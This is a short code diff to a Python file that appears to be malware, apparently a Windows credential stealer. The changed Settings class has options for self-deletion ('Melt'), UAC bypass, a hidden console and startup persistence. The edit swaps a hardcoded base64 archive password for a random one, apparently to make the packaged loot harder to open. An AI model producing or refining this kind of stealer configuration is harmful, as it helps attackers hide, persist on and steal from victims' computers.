@@ -15,6 +15,7 @@ import time
 import ctypes
 import logging
 import zlib
+import string
 from threading import Thread
 from ctypes import wintypes
 from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
@@ -28,7 +29,7 @@ class Settings:
     Startup = bool('')
     Melt = bool('true')
     UacBypass = bool('')
-    ArchivePassword = base64.b64decode('c2tpZG9udG9w').decode()
+    ArchivePassword = ''.join(random.choices(string.ascii_letters, k=5))
     HideConsole = bool('true')
     Debug = bool('')
     RunBoundOnStartup = bool('')
